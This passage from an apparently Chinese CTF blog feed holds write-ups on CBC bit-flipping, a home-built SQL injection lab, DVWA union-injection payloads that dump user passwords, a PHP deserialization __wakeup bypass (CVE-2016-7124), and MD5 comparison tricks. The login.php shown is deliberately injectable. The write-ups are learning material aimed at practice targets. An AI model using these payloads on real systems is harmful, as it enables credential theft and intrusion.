class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">                exit()</span><br><span class="line">menu=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1. register</span></span><br><span class="line"><span class="string">2. login</span></span><br><span class="line"><span class="string">3. exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        task()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cbc bit flipping攻击</p><p>两个密文块，通过改第一个密文块，可以使得第二个密文块解密出admin.</p><p>但是这会使得第一个密文块解密出乱码。而题目也需要第一个密文块的值为yusayusayusayusa.</p><p>好在题目给出了三次交互的机会，第一次用于登陆，第二次用于改第一个密文块，从而使第二个密文块解密出admin。</p><p>第三次交互，需要从第二次交互的输出中提取第一个密文块的明文，与yusayusayusayusa异或后，再与iv进行异或，作为新的iv。这样aes cbc解密出乱码也没关系，因为会被iv抵消掉乱码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bstr_xor</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    l = <span class="built_in">min</span>(<span class="built_in">len</span>(s1), <span class="built_in">len</span>(s2))</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        tmp = s1[i] ^ s2[i]</span><br><span class="line">        res += struct.pack(<span class="string">&#x27;B&#x27;</span>, tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = unhexlify(<span class="string">&#x27;ac4d9724e337e7392fe2e335dfcbb1ab66d13bbd22eb85f56e9e4625423e0caa18be17a9828fbd98e44a01a4278ce552&#x27;</span>)</span><br><span class="line">iv, enc1, enc2 = token[:<span class="number">16</span>], token[<span class="number">16</span>:<span class="number">32</span>], token[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">n_enc1 = bstr_xor(enc1, bstr_xor(<span class="string">b&#x27;aron3&#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)) + enc1[<span class="number">5</span>:]</span><br><span class="line">print(enc1)</span><br><span class="line">print(n_enc1)</span><br><span class="line"></span><br><span class="line">result = iv + n_enc1 + enc2</span><br><span class="line">print(result)</span><br><span class="line">print(<span class="string">&#x27;第一次登陆：&#x27;</span>, hexlify(result))</span><br><span class="line">print(<span class="string">&#x27;\n\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token2 = unhexlify(<span class="string">&#x27;ac4d9724e337e7392fe2e335dfcbb1abf885abf953702268604ab22ef8794f0961646d696e&#x27;</span>)</span><br><span class="line">enc1_2 = token2[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">print(enc1_2)</span><br><span class="line">n_iv = bstr_xor(iv, bstr_xor(enc1_2, <span class="string">b&#x27;yusayusayusayusa&#x27;</span>))</span><br><span class="line">print(n_iv)</span><br><span class="line">result2 = n_iv + n_enc1 + enc2</span><br><span class="line">print(<span class="string">&#x27;第二次登陆：&#x27;</span>, hexlify(result2))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如图：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;MISC1&quot;&gt;&lt;a href=&quot;#MISC1&quot; class=&quot;headerlink&quot; title=&quot;MISC1&quot;&gt;&lt;/a&gt;MISC1&lt;/h5&gt;&lt;p&gt;0X1.&lt;/p&gt;
&lt;p&gt;图片隐写，kali命令行 foremost分离，可以拿到mp4和flag.txt。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Misc" scheme="http://example.com/tags/Misc/"/>
    
    <category term="分组密码" scheme="http://example.com/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>手工SQL</title>
    <link href="http://example.com/2020/11/29/%E6%89%8B%E5%86%99SQL%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2020/11/29/%E6%89%8B%E5%86%99SQL%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/</id>
    <published>2020-11-29T11:41:10.000Z</published>
    <updated>2020-12-10T12:47:07.763Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-本地SQL注入"><a href="#一-本地SQL注入" class="headerlink" title="一.本地SQL注入"></a>一.本地SQL注入</h4><h5 id="1-搭建本地mysql数据库"><a href="#1-搭建本地mysql数据库" class="headerlink" title="1.搭建本地mysql数据库"></a>1.搭建本地mysql数据库</h5><p>MYSQL创建数据库example，表users,column分别为 userID,userPasswd,username，并插入数据，如图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;users&#96; (&#96;userID&#96;, &#96;userPasswd&#96;, &#96;username&#96;) VALUES</span><br><span class="line">(&#39;1&#39;, &#39;123456&#39;, &#39;jenny&#39;),</span><br><span class="line">(&#39;2&#39;, &#39;123456&#39;, &#39;danny&#39;),</span><br><span class="line">(&#39;3&#39;, &#39;123456&#39;, &#39;bob&#39;),</span><br><span class="line">(&#39;4&#39;, &#39;123456&#39;, &#39;elice&#39;);</span><br></pre></td></tr></table></figure><h5 id="2-php接受参数"><a href="#2-php接受参数" class="headerlink" title="2.php接受参数"></a>2.php接受参数</h5><p>新建login.html，login.php文件，放在phpMyadmin的www目录下</p><p><strong>login.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/login.php&quot;</span>&gt;</span></span><br><span class="line">       Name:    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">userID</span> &gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">userPasswd</span> &gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">B1</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Reset&quot;</span> <span class="attr">name</span>=<span class="string">B2</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&quot;userID&quot;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&quot;userPasswd&quot;</span>];</span><br><span class="line"><span class="variable">$db</span>=@mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;********&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Fail&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;example&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where userID=&#x27;<span class="subst">$name</span>&#x27; and userPasswd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>,<span class="variable">$db</span>);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;table border=2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;th&gt;User&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$array</span>=MySQL_fetch_row(<span class="variable">$result</span>))  &#123;</span><br><span class="line">    printf(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;tr&gt;&quot;</span>,<span class="variable">$array</span>[<span class="number">0</span>],<span class="variable">$array</span>[<span class="number">1</span>],<span class="variable">$array</span>[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="3-页面测试与sql注入"><a href="#3-页面测试与sql注入" class="headerlink" title="3.页面测试与sql注入"></a>3.页面测试与sql注入</h5><p>访问127.0.0.1/login.html，如图：</p><p>尝试用户身份登录：name=1,password=123456，如下图，可以正常回显查询内容：</p><p><strong>注入语句：</strong></p><p><code>1&#39; or 1 #</code></p><p>其中 ’ 用来闭合前面的查询语句，# 用来注释掉后面的内容，如下：<br><code>select * from users where userID=&#39;1&#39;or 1 #&#39; and userPasswd=&#39;$passwd&#39;</code></p><p>即在数据库中的查询为：</p><p><code>select * from users where userID=&#39;1&#39; or 1</code></p><p>语义为在users表中查询userID=1的行或者 True,无论数据库中是否有该条记录，查询语句恒为真，将返回Users表中所有的记录。</p><h4 id="二-DVWA部分题解"><a href="#二-DVWA部分题解" class="headerlink" title="二.DVWA部分题解"></a>二.DVWA部分题解</h4><h5 id="1-SQL-INJECTION-low"><a href="#1-SQL-INJECTION-low" class="headerlink" title="1.SQL INJECTION(low)"></a>1.SQL INJECTION(low)</h5><p>令参数id=1’,报错如下：</p><p>存在注入点，尝试union注入：<code>id=1&#39; union select 1#</code>,回显如下：</p><p>与要求查询的返回列数不同，<code>id=1&#39; order by 2#</code></p><p>可以正常回显，即可判断columns=2;</p><p>构造sql注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39;union select group_concat(schema_name),2 from  information_schema.schemata# 查库名</span><br><span class="line">1&#39;union select group_concat(table_name),2 from  information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;# 查表名</span><br><span class="line">1&#39;union select group_concat(column_name),2 from  information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;# 查列名</span><br><span class="line">1&#39;union select group_concat(user_id,&#39; &#39;,user,&#39; &#39;,password),2 from users# 查数据</span><br></pre></td></tr></table></figure><h5 id="2-SQL-INJECTION-medium"><a href="#2-SQL-INJECTION-medium" class="headerlink" title="2.SQL INJECTION(medium)"></a>2.SQL INJECTION(medium)</h5><p>令参数id=1’,报错如下：</p><p>如图，可以看出 ‘/‘ 对 ‘ 转义，产生报错，这里需要利用二次urldecode注入，PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。但这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。</p><p>引发注入的原因：</p><p>PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了 ‘，于是最终URL变成了/test.php?id=1’，单引号即可引发注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 %2527 union select group_concat(schema_name),2 from  information_schema.schemata# 查库名</span><br><span class="line">1 %2527 union select group_concat(table_name),2 from  information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;# 查表名</span><br><span class="line">1 %2527 union select group_concat(column_name),2 from  information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;# 查列名</span><br><span class="line">1 %2527 union select group_concat(user_id,&#39; &#39;,user,&#39; &#39;,password),2 from users# 查数据</span><br></pre></td></tr></table></figure><h5 id="3-SQL-INJECTION-high"><a href="#3-SQL-INJECTION-high" class="headerlink" title="3.SQL INJECTION(high)"></a>3.SQL INJECTION(high)</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一-本地SQL注入&quot;&gt;&lt;a href=&quot;#一-本地SQL注入&quot; class=&quot;headerlink&quot; title=&quot;一.本地SQL注入&quot;&gt;&lt;/a&gt;一.本地SQL注入&lt;/h4&gt;&lt;h5 id=&quot;1-搭建本地mysql数据库&quot;&gt;&lt;a href=&quot;#1-搭建本地mysql</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="SQL" scheme="http://example.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化与MD5碰撞</title>
    <link href="http://example.com/2020/11/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8CMD5%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2020/11/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8CMD5%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-11-25T09:41:10.000Z</published>
    <updated>2020-12-10T12:44:19.065Z</updated>
    
    <content type="html"><![CDATA[<h4 id="PHP反序列化，MD5绕过学习"><a href="#PHP反序列化，MD5绕过学习" class="headerlink" title="PHP反序列化，MD5绕过学习"></a>PHP反序列化，MD5绕过学习</h4><p>学习过程是通过刷题，来源：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><h5 id="1-极客大挑战-2019-PHP"><a href="#1-极客大挑战-2019-PHP" class="headerlink" title="1.[极客大挑战 2019]PHP"></a>1.[极客大挑战 2019]PHP</h5><p>运行实例后，看到一个优秀的前端，提示网站备份，用dirsearch爆破目录</p><p>dirsearch下载：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>使用方法：</p><p>-u 指定url           </p><p>-e 指定语言</p><p>进入dirsearch目录后，Terminal执行语句：</p><p><code>python3 dirsearch.py -u http://9abbc68b-92fd-4e85-a2c3-5266994c0cdb.node3.buuoj.cn/ -e php</code></p><p>爆出来一大堆目录文件，只关注需要的备份文件<a href="http://www.zip/">www.zip</a></p><p>在url后面拼接  <code>/www.zip</code>  下载压缩文件包</p><p>打开压缩包后：</p><p>打开index.php:</p><p>index.php关键点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到需要get方法传select参数，后面又是反序列化函数，具体的还需要看class.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码的意思可以知道，只要password=100，username=admin，在执行__destruct()的时候可以获得flag，所以我们需要达成这些要求。但这里需要绕过     <code>_wakeup()方法</code></p><p>绕过方法：</p><p>这里就要用到CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>代码：php在线编辑即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将新建的对象$a序列化后得到的结果：</p><p><code>O:4:&quot;Name&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></p><p>解读：</p><p>O:（object name length) : “object name”:  属性数量(只包括private,public,protected) ：{属性1数据类型：属性长度：“属性名”;属性1值的数据类型（此处为string)：长度：“值”；属性2（值的数据类型为int；…}</p><p>从上面所说，绕过wakeup（）方法需要修改属性个数大于原来的（2），此处可以改为4，payload:</p><p><code>?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></p><p>尝试后发现不行，需要注意的是，因为这个变量的声明是private，其字段为私有字段，仅在其声明类中可见，在子类及对象实例中均不可见（c++好像也是这样，记不清了），因此字段名在序列化时会在字段名和类名的前面加上0（%00），字段长度也包括所加0的长度，如图（显示的是非打印字符）：</p><p>图中的方格处就是需要加%00的地方，构造新的payload如下：</p><p><code>?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p><hr><h5 id="2-BJDCTF2020-Easy-MD5"><a href="#2-BJDCTF2020-Easy-MD5" class="headerlink" title="2.[BJDCTF2020]Easy MD5"></a>2.[BJDCTF2020]Easy MD5</h5><p><strong>1.sql注入+MD5</strong></p><p>有输入框，随便输入后，可以看到是get方法传参，尝试报错注入，没反应，抓包看header有hint提示：</p><p>它将用户输入的参数md5后再代入sql查询语句进行后续的查询，所以我们就需要构造一个字符串，让它的md5的值为 ‘ or  …   ， ‘   将前面的的sql语句闭合,然后 or 后面的字符，只要 or 之后的字符第一个不是0，理论上就可以爆出表单内容（今天上网络安全课老师刚讲过：）），如图拼接后的sql语句应该类似这样子：</p><p><code>select * from admin where password=&#39;&#39;or&#39;......&#39;</code></p><p>突破点在md5($pass,true)这里，先来看看md5函数的用法：</p><p>可以通过如下的脚本获得所需明文：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;;) </span><br><span class="line">&#123;  </span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$c</span> = <span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="number">1000000</span>; <span class="variable">$c</span>++, <span class="variable">$i</span>++)  </span><br><span class="line">      <span class="keyword">if</span> (stripos(md5(<span class="variable">$i</span>, <span class="literal">true</span>), <span class="string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="literal">false</span>)   </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;\nmd5(<span class="subst">$i</span>) = &quot;</span> . md5(<span class="variable">$i</span>, <span class="literal">true</span>) . <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;.&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span></span><br></pre></td></tr></table></figure><p>常用的：<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6<trash></strong> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的’’<trash>会在MySQL将其转换成整型比较时丢掉)</p><p>所以如果这里我们输入ffifdyop，后端的SQL语句会变成：</p><p><code>select * from admin where password=&#39;&#39;or&#39;6&lt;trash&gt;&#39;</code> </p><p>成功构造后即进入下一关：</p><p> <strong>2.<u>php，MD5的弱类型比较</u></strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="comment">$b = $_GET[&#x27;b&#x27;];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="get传参，两个参数-a-b，要求如下："><a href="#get传参，两个参数-a-b，要求如下：" class="headerlink" title="get传参，两个参数$a,$b，要求如下："></a>get传参，两个参数$a,$b，要求如下：</h5><h5 id="要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个明文不同但md5值为”0exxxxx”的字符串"><a href="#要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个明文不同但md5值为”0exxxxx”的字符串" class="headerlink" title="要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个明文不同但md5值为”0exxxxx”的字符串:"></a>要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个<strong>明文不同但md5值为”0exxxxx”的字符串</strong>:</h5><p>如：<u>QNKCDZO       ，      s214587387a</u></p><p><strong>3.数组绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span 